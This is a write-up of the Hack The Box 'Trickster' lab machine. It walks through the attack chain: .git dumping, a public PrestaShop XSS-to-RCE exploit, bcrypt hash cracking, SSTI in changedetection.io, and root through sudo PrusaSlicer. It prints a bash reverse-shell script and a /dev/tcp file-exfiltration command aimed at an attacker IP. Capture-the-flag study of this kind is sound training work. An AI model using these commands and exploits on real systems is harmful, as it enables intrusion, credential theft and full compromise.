---
title: HTB Trickster Writeup
description: Trickster is a medium-level Linux machine on HTB, which released on September 21, 2024.
date: 2024-10-11 11:33:00 +0800
categories: [HacktheBox, Medium]
tags: [ctf, hackthebox, season6, linux]
math: true
mermaid: true
image:
  path: /assets/img/htb/trickster.htb/Trickster.png
---
## Box Info

Trickster starts off by discovering a subdoming which uses PrestaShop. Dumping a leaked .git folder gives source code and admin panel is found. Chaining XSS and Theme Upload, www-data user is reached. A docker is found inside the box which hosts a Changedetection.io. Abusing SSTI, we are root inside the docker. Credentials can be found on .history which can be used to login as root on the box. The root path got changed a few weeks after box got released. The fixed path goes on like this. We won't find credentials on .history but there is a datastore directory which has 2 backup files. Opening one of the files gives us a .txt.br file which gives credentials to adam user. Adam user can use pursaslicer as root without password. Malicous scripts can be executed with prusaslicer after a .3mf file is sliced and get shell as root. 

## Recon
### nmap

Nmap finds only ports `22` and `80` open.
```console
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster]
└──╼ $ nmap -sVC -p- 10.129.215.104
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-11 17:15 +03
Nmap scan report for 10.129.215.104
Host is up (0.044s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:01:0e:7b:b4:da:b7:2f:bb:2f:d3:a3:8c:a6:6d:87 (ECDSA)
|_  256 90:c6:f3:d8:3f:96:99:94:69:fe:d3:72:cb:fe:6c:c5 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://trickster.htb/
Service Info: Host: _; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.75 seconds
```
Also gives the domain on port `80` as `trickster.htb`. 
Adding it to the `/etc/hosts` file.

```text
# Others
10.129.215.104 trickster.htb
```

### trickster.htb - Port 80

Got a web page. Nothing interesting.
![image1](/assets/img/htb/trickster.htb/port80_1.png){: width="972" height="589" }

Clicking the buttons below and one of them gives a new domain `shop.trickster.htb`.
![image2](/assets/img/htb/trickster.htb/port80_2.png){: width="972" height="589" }

### shop.trickster.htb - Port 80

`shop.trickster.htb` domain hosts a ecommers site called `PrestaShop`.

![shop1](/assets/img/htb/trickster.htb/shop.png){: width="800" height="500" }


Creating account to enumarate more, trying to buy items and use the functions on profile page but couldn't find anything useful.

![shop2](/assets/img/htb/trickster.htb/shop2.png){: width="800" height="500" }

Searching for public exploits for `PrestaShop`. Only found sql injection and module injection but both don't work.

![shop3](/assets/img/htb/trickster.htb/vuln.png){: width="800" height="500" }
 
## Shell as www-data 

### git-dumper

While enumerating the page, ran ffuf in the background. Ffuf got only 1 hit which is `.git`. Using `git-dumper`, we can dump the .git folder of website and 
see the logs and previous commits on the repo.

```console
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster]
└──╼ $ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://shop.trickster.htb/FUZZ -fs 283

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://shop.trickster.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 283
________________________________________________

.git                    [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 69ms]
```
Might take a while beacuse folder is large.
```console
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster]
└──╼ $ ./git-dumper-linux http://shop.trickster.htb/.git/
Downloaded 'info/exclude' (240 bytes)
	Not using file 'info/exclude' for anything right now
Downloaded 'logs/HEAD' (163 bytes)
Downloaded 'description' (73 bytes)
	Not using file 'description' for anything right now
Downloaded 'config' (112 bytes)
	Not using file 'config' for anything right now
	Found log with 1 hashes
Downloaded 'COMMIT_EDITMSG' (20 bytes)
	Not using file 'COMMIT_EDITMSG' for anything right now
Downloaded 'HEAD' (28 bytes)
	Found ref path refs/heads/admin_panel
  .
  .
  .
  .
  .
Downloaded 'objects/c7/1623070c5c6d7212c4d645a043646e1dd48675' (1143 bytes)
	Found blob object
```
Cd into `git-dumped`, using `git log` shows us previous commits. Using `git show 0cbc7831c1104f1fb0948ba46f75f1666e18e64c` renders the changes.
```console
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster]
└──╼ $ cd git-dumped/.git/
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster/git-dumped/.git]
└──╼ $ ls -la
total 26496
drwxr-xr-x 1 suce suce      134 Eki 12 19:45 .
drwxr-xr-x 1 suce suce        8 Eki 12 19:40 ..
-rw-r--r-- 1 suce suce       20 Eki 12 19:40 COMMIT_EDITMSG
-rw-r--r-- 1 suce suce      112 Eki 12 19:40 config
-rw-r--r-- 1 suce suce       73 Eki 12 19:40 description
-rw-r--r-- 1 suce suce 26858958 Eki 12 19:45 file.txt
-rw-r--r-- 1 suce suce       28 Eki 12 19:40 HEAD
-rw-r--r-- 1 suce suce   252177 Eki 12 19:40 index
drwxr-xr-x 1 suce suce       14 Eki 12 19:40 info
drwxr-xr-x 1 suce suce        8 Eki 12 19:40 logs
drwxr-xr-x 1 suce suce     1020 Eki 12 19:40 objects
drwxr-xr-x 1 suce suce       10 Eki 12 19:40 refs

┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickste/git-dumped/.git]
└──╼ $ git log
commit 0cbc7831c1104f1fb0948ba46f75f1666e18e64c (HEAD -> admin_panel)
Author: adam <adam@trickster.htb>
Date:   Fri May 24 04:13:19 2024 -0400

    update admin pannel

┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster/git-dumped/.git]
└──╼ $ git show 0cbc7831c1104f1fb0948ba46f75f1666e18e64c
```
Reading a few lines on the code and `/admin634ewutrx1jgitlooaj/` looks like the admin directory.
```text
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
+THE SOFTWARE.
diff --git a/admin634ewutrx1jgitlooaj/themes/default/js/jquery.fileupload.js b/admin634ewutrx1jgitlooaj/themes/default/js/jquery.fileupload.js
new file mode 100644
index 0000000..7d1c7eb
--- /dev/null
+++ b/admin634ewutrx1jgitlooaj/themes/default/js/jquery.fileupload.js
@@ -0,0 +1,1384 @@
```

Entering `http://shop.trickster.htb/admin634ewutrx1jgitlooaj/` gives the admin login page. Version is `8.1.5` .
![admin_page](/assets/img/htb/trickster.htb/admin.png){: width="800" height="500" }

### CVE-2024-34716

There is a XSS vulnerability on PrestaShop 8.1.5 by creating a malicious PNG file which executes js code and steals the cookies from who viewed the file, attacker can use the stolen cookies to upload a malicious .zip and download theme which results with remote-code execution. There is a public POC available by the founder of the vulnerability.
This is also updated version of the original POC which was kinda messy. To learn more about the exploit, read this [**blog**](https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/) .

Use `git clone https://github.com/aelmokhtar/CVE-2024-34716` and run `exploit.py`. 

```console
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster]
└──╼ $ nc -lvnp 12345
listening on [any] 12345 ...
connect to [10.10.14.145] from (UNKNOWN) [10.129.136.211] 51484
Linux trickster 5.15.0-121-generic #131-Ubuntu SMP Fri Aug 9 08:29:53 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 17:11:28 up 19 min,  0 users,  load average: 0.39, 0.25, 0.19
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
## Shell as james
Switching to better shell.
```text
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@trickster:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@trickster:/$ 
```

### MySQL Creds

Trying to find database file on prestashop directory. Viewing a few files, we can find the following.

```console
www-data@trickster:~/prestashop/config$ cat config.inc.php
.
.
.
/* No settings file? goto installer... */
if (!file_exists(_PS_ROOT_DIR_ . '/app/config/parameters.yml') && !file_exists(_PS_ROOT_DIR_ . '/app/config/parameters.php')) {
    Tools::redirectToInstall();
}
.
.
. 
```
Got db creds on `/app/config/parameters.php`. `(Password is not shown)`

```text
<?php return array (
  'parameters' => 
  array (
    'database_host' => '127.0.0.1',
    'database_port' => '',
    'database_name' => 'prestashop',
    'database_user' => 'ps_user',
    'database_password' => '**********',
    'database_prefix' => 'ps_',
    'database_engine' => 'InnoDB',
    'mailer_transport' => 'smtp',
    'mailer_host' => '127.0.0.1',
    'mailer_user' => NULL,    
```
Logging into database.
```console
www-data@trickster:~/prestashop/app/config$ mysql -u ps_user -p
mysql -u ps_user -p
Enter password:

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 1189
Server version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> use prestashop
use prestashop
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [prestashop]> show tables;
show tables;
+-------------------------------------------------+
| Tables_in_prestashop                            |
+-------------------------------------------------+
276 rows in set (0.001 sec)

MariaDB [prestashop]> select * from ps_employee;
select * from ps_employee;
```
Dumping `ps_employee` gives hashes for `admin@trickster.htb` and `james@trickster.htb`.

`Hashcat` cracks one of the hashes and got a password. `(Password is not shown)`

```console
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster]
└──╼ $ hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD Ryzen 5 2600 Six-Core Processor, 2201/4467 MB (1024 MB allocatable), 3MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/*********:al**************
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/*********
Time.Started.....: Mon Oct 14 21:08:34 2024 (17 secs)
Time.Estimated...: Mon Oct 14 21:08:51 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     1888 H/s (2.84ms) @ Accel:3 Loops:16 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 37044/14344385 (0.26%)
Rejected.........: 0/37044 (0.00%)
Restore.Point....: 37035/14344385 (0.26%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-16
Candidate.Engine.: Device Generator
Candidates.#1....: andrew17 -> alkaline
Hardware.Mon.#1..: Util: 82%
```

Trying the password on `james` user and logs us in. User flag can be found in `user.txt`.
```console
www-data@trickster:/home$ ls
ls
adam  james  runner
```
```console
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster]
└──╼ $ ssh james@trickster.htb
james@trickster.htb's password: 
Last login: Thu Sep 26 11:13:01 2024 from 10.10.14.41
james@trickster:~$ ls
user.txt
james@trickster:~$ 
```
## Shell as root (not fixed)
### Enumeration

`Sudo -l` doesn't give us anything. Checking open ports, also nothing new or useful.

```console
james@trickster:~$ sudo -l
[sudo] password for james: 
Sorry, try again.
[sudo] password for james: 
sudo: 1 incorrect password attempt
james@trickster:~$ ss -tlnp
State                 Recv-Q                Send-Q                                Local Address:Port                                  Peer Address:Port                Process                
LISTEN                0                     80                                        127.0.0.1:3306                                       0.0.0.0:*                                          
LISTEN                0                     4096                                      127.0.0.1:36293                                      0.0.0.0:*                                          
LISTEN                0                     511                                         0.0.0.0:80                                         0.0.0.0:*                                          
LISTEN                0                     4096                                  127.0.0.53%lo:53                                         0.0.0.0:*                                          
LISTEN                0                     128                                         0.0.0.0:22                                         0.0.0.0:*                                          
LISTEN                0                     128                                            [::]:22                                            [::]:*                                          
```
### Docker Enum

Checking both `ps aux` and `ifconfig` says there is a docker running.
```console
james@trickster:~$ ifconfig
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:08:3d:2a:04  txqueuelen 0  (Ethernet)
        RX packets 73  bytes 4364 (4.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 9  bytes 378 (378.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
```console       
james@trickster:~$ ps aux | grep container
root        1277  0.1  1.1 1800788 47388 ?       Ssl  16:52   0:11 /usr/bin/containerd
root        1356  0.0  1.9 1977936 76632 ?       Ssl  16:52   0:01 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root       10457  0.0  0.3 1238400 12416 ?       Sl   18:20   0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id a4b9a36ae7ffc48c2b451ead77f93a8572869906f386773c3de528ca950295cd -address /run/containerd/containerd.sock
james      11982  0.0  0.0   7008  2044 pts/2    R+   18:35   0:00 grep --color=auto container
```
Using this simple `ping sweep`, IP is found as `172.17.0.2`.

```console 
james@trickster:~$ for ip in {1..16}; do ping -c 1 -W 1 172.17.0.$ip &> /dev/null && echo "172.17.0.$ip is up"; done
172.17.0.1 is up
172.17.0.2 is up
james@trickster:~$
```
After finding the IP, checking the open ports. Noticed i can use `netcat` to find open ports. Using this command found online, we find the only port open is `5000`.
```console 
james@trickster:~$ for port in {1..9999}; do nc -zv -w 1 172.17.0.2 $port 2>&1 | grep succeeded; done
Connection to 172.17.0.2 5000 port [tcp/*] succeeded!
james@trickster:~$
```

Downloading `nmap` binary from my host and searching also achieves the same thing.

```console
james@trickster:~$ wget 10.10.14.145:8000/nmap
--2024-10-14 18:40:28--  http://10.10.14.145:8000/nmap
Connecting to 10.10.14.145:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5944464 (5.7M) [application/octet-stream]
Saving to: ‘nmap’
nmap                                            100%[=====================================================================================================>]   5.67M  2.08MB/s    in 2.7s    

2024-10-14 18:40:31 (2.08 MB/s) - ‘nmap’ saved [5944464/5944464] 

james@trickster:~$ ./nmap -p- 172.17.0.2

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-10-14 18:42 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.17.0.2
Host is up (0.00046s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
5000/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 36.69 seconds
```
`Forwarding` the port to my host to login using `firefox`.

```console
┌─[suce@parrot]─[~]
└──╼ $ ssh -L 5000:172.17.0.2:5000 james@trickster.htb
james@trickster.htb's password: 
Last login: Mon Oct 14 19:12:02 2024 from 10.10.14.145
```
### Port 5000 - ChangeDetection.io

Entering the port on my machine gives a webpage login. `ChangeDetection.io` is service that notifies you when a site you choose or add is changed by email,notification or apps like telegram and whatsapp.

![change1](/assets/img/htb/trickster.htb/change1.png){: width="800" height="500" }

Trying the same password used on `james`, logs in.

![change2](/assets/img/htb/trickster.htb/change2.png){: width="800" height="500" }


### CVE-2024-32651

`ChangeDetection.io` has a Remote Code Execution (RCE) on `V0.45` when malicious ssti payload is injected into notification body section. When there is a change on the site we entered, the injected payload is executed on application.

Using [**this**](https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/) payload on `exploit.db` and changing it a bit, gets a connection back.

Root password can be found on `history` tab. `su root` on `james` ssh shell with the password. Machine pwned!

## Fixed Root Way (Intended)

This box actually got fixed after a few weeks because finding `root pass` on a history tab was way too easy for a box in this level and we didn't even use `adam` user. So i'am going to show the intended path to getting `root`. 

### Shell as adam

Literally nothing except this `datastore` folder.

```console
root@a4b9a36ae7ff:/app# ls /
ls /
app  boot	dev  home  lib64  mnt  proc  run   srv	tmp  var
bin  datastore	etc  lib   media  opt  root  sbin  sys	usr
root@a4b9a36ae7ff:/app# cd /datastore
cd /datastore
root@a4b9a36ae7ff:/datastore# ls
ls
5205dd3b-8a75-45ab-822a-fad680ab83e1  secret.txt	      url-list.txt
Backups				      url-list-with-tags.txt  url-watches.json
root@a4b9a36ae7ff:/datastore# cd Backups
cd Backups
root@a4b9a36ae7ff:/datastore/Backups# ls
ls
changedetection-backup-20240830194841.zip
changedetection-backup-20240830202524.zip
```

Found 2 backup folders. Using `/dev/tcp/ip/port`, i can send the zip to my host and listen with `nc` and extract it.

```console
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster]
└──╼ $ nc -l -p 9999 -q 1 > changedetection-backup-20240830194841.zip
```

```console
root@a4b9a36ae7ff:/datastore/Backups# cat changedetection-backup-20240830194841.zip > /dev/tcp/10.10.14.145/9999
<kup-20240830194841.zip > /dev/tcp/10.10.14.145/9999
```
Viewing the .zip file.

```console
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster]
└──╼ $ unzip changedetection-backup-20240830194841.zip 
Archive:  changedetection-backup-20240830194841.zip
   creating: b4a8b52d-651b-44bc-bbc6-f9e8c6590103/
 extracting: b4a8b52d-651b-44bc-bbc6-f9e8c6590103/f04f0732f120c0cc84a993ad99decb2c.txt.br  
 extracting: b4a8b52d-651b-44bc-bbc6-f9e8c6590103/history.txt  
  inflating: secret.txt              
  inflating: url-list.txt            
  inflating: url-list-with-tags.txt  
  inflating: url-watches.json        
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster]
└──╼ $ ls
b4a8b52d-651b-44bc-bbc6-f9e8c6590103       url-list.txt
changedetection-backup-20240830194841.zip  url-list-with-tags.txt
changedetection-backup-20240830202524.zip  url-watches.json
secret.txt
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster]
└──╼ $ cd b4a8b52d-651b-44bc-bbc6-f9e8c6590103/
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster/b4a8b52d-651b-44bc-bbc6-f9e8c6590103]
└──╼ $ ls
f04f0732f120c0cc84a993ad99decb2c.txt.br  history.txt
```
Found a compressed .txt file. Searching the web says it's `brotli`.

![brotli](/assets/img/htb/trickster.htb/brotli.png){: width="800" height="500" }

Decompressing with `brotli` and viewing file gives us creds for `adam` user. `(Password not shown)`
```console
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster/b4a8b52d-651b-44bc-bbc6-f9e8c6590103]
└──╼ $ sudo apt install brotli
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
.
.
.
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster/b4a8b52d-651b-44bc-bbc6-f9e8c6590103]
└──╼ $ brotli -d f04f0732f120c0cc84a993ad99decb2c.txt.br 
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster/b4a8b52d-651b-44bc-bbc6-f9e8c6590103]
└──╼ $ ls
f04f0732f120c0cc84a993ad99decb2c.txt  f04f0732f120c0cc84a993ad99decb2c.txt.br  history.txt
```
```console
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster/b4a8b52d-651b-44bc-bbc6-f9e8c6590103]
└──╼ $ cat f04f0732f120c0cc84a993ad99decb2c.txt
  This website requires JavaScript.
    Explore Help
    Register Sign In
                james/prestashop
            Raw Permalink Blame History

                < ? php return array (                                                                                                                                 
                'parameters' =>                                                                                                                                        
                array (                                                                                                                                                
                'database_host' => '127.0.0.1' ,                                                                                                                       
                'database_port' => '' ,                                                                                                                                
                'database_name' => 'prestashop' ,                                                                                                                      
                'database_user' => 'adam' ,                                                                                                                            
                'database_password' => 'ad**********' ,                                                                                                               
                'database_prefix' => 'ps_' ,                                                                                                                           
                'database_engine' => 'InnoDB' ,                                                                                                                        
                'mailer_transport' => 'smtp' ,                                                                                                                         
                'mailer_host' => '127.0.0.1' ,
```   

### Shell as root

SSH to `adam` using the password. Using `sudo -l`, we can use `prusaslicer` as `root` without password.

```console
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster]
└──╼ $ ssh adam@trickster.htb
adam@trickster.htb's password: 
adam@trickster:~$ sudo -l
Matching Defaults entries for adam on trickster:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User adam may run the following commands on trickster:
    (ALL) NOPASSWD: /opt/PrusaSlicer/prusaslicer
adam@trickster:~$
```

When i pwned the box for the first time (not fixed), i made a eaiser `prusaslicer` payload to try getting `root` from `adam`. Use `git clone https://github.com/suce0155/prusaslicer_exploit` 


![prusa](/assets/img/htb/trickster.htb/prusa.png){: width="800" height="500" }

Do everything [**here**](https://github.com/suce0155/prusaslicer_exploit/blob/main/README.md) or below and you will get shell as `root`.


```console
adam@trickster:~$ ls
evil.3mf  exploit.sh
adam@trickster:~$ mv exploit.sh /tmp
adam@trickster:~$ chmod +x /tmp/exploit.sh 
adam@trickster:~$ cat /tmp/exploit.sh 
/bin/bash -i >& /dev/tcp/10.10.14.145/9999 0>&1
adam@trickster:~$ sudo /opt/PrusaSlicer/prusaslicer -s evil.3mf 
10 => Processing triangulated mesh
20 => Generating perimeters
30 => Preparing infill
45 => Making infill
65 => Searching support spots
69 => Alert if supports needed
print warning: Detected print stability issues:

EXPLOIT
```

```console
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster/b4a8b52d-651b-44bc-bbc6-f9e8c6590103/prusaslicer_exploit]
└──╼ $ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.145] from (UNKNOWN) [10.129.136.125] 52202
root@trickster:/home/adam# id
id
uid=0(root) gid=0(root) groups=0(root)
```


